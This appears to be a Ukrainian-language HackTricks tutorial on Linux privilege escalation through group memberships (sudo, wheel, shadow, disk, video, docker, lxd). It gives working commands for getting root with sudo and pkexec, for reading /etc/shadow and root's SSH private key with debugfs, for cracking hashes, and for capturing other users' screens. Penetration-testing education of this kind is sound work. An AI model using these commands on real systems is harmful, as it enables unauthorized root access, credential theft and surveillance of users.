{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin Groups

## **PE - Метод 1**

**Іноді**, **за замовчуванням \(або через те, що деяке програмне забезпечення цього потребує\)** всередині файлу **/etc/sudoers** ви можете знайти деякі з цих рядків:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконувати будь-що як sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```text
sudo su
```
## PE - Метод 2

Знайдіть всі suid бінарні файли та перевірте, чи є бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявите, що двійковий файл pkexec є SUID двійковим файлом і ви належите до sudo або admin, ви, ймовірно, зможете виконувати двійкові файли як sudo, використовуючи pkexec. Перевірте вміст:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Там ви знайдете, які групи мають право виконувати **pkexec** і **за замовчуванням** в деяких linux можуть **з'явитися** деякі групи **sudo або admin**.

Щоб **стати root, ви можете виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви намагаєтеся виконати **pkexec** і отримуєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не тому, що у вас немає дозволів, а тому, що ви не підключені без GUI**. І є обхід цього питання тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні ssh сесії**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**Іноді**, **за замовчуванням** у файлі **/etc/sudoers** ви можете знайти цей рядок:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконувати будь-що як sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```text
sudo su
```
# Shadow Group

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **зламати деякі хеші**.

# Дискова група

Ця привілегія майже **еквівалентна доступу root**, оскільки ви можете отримати доступ до всіх даних всередині машини.

Файли:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зверніть увагу, що використовуючи debugfs, ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, ви можете зробити:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо ви спробуєте **записати файли, що належать root** \(наприклад, `/etc/shadow` або `/etc/passwd`\), ви отримаєте помилку "**Доступ заборонено**".

# Video Group

Використовуючи команду `w`, ви можете дізнатися, **хто увійшов в систему**, і вона покаже вихід, подібний до наступного:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi фізично увійшов** до терміналу на машині.

Група **video** має доступ до перегляду виходу екрану. В основному, ви можете спостерігати за екранами. Щоб це зробити, вам потрібно **захопити поточне зображення на екрані** в сирих даних і отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Щоб **відкрити** **сирий образ**, ви можете використовувати **GIMP**, вибрати файл **`screen.raw`** і вибрати тип файлу **Сирі дані зображення**:

![](../../images/image%20%28208%29.png)

Потім змініть Ширину та Висоту на ті, що використовуються на екрані, і перевірте різні Типи зображень \(і виберіть той, який найкраще відображає екран\):

![](../../images/image%20%28295%29.png)

# Група Root

Схоже, що за замовчуванням **учасники групи root** можуть мати доступ до **модифікації** деяких **конфігураційних файлів сервісів** або деяких **файлів бібліотек** або **інших цікавих речей**, які можуть бути використані для ескалації привілеїв...

**Перевірте, які файли можуть модифікувати учасники root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

Ви можете змонтувати кореневу файлову систему хост-машини до обсягу екземпляра, тому, коли екземпляр запускається, він відразу завантажує `chroot` у цей обсяг. Це ефективно надає вам root на машині.

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
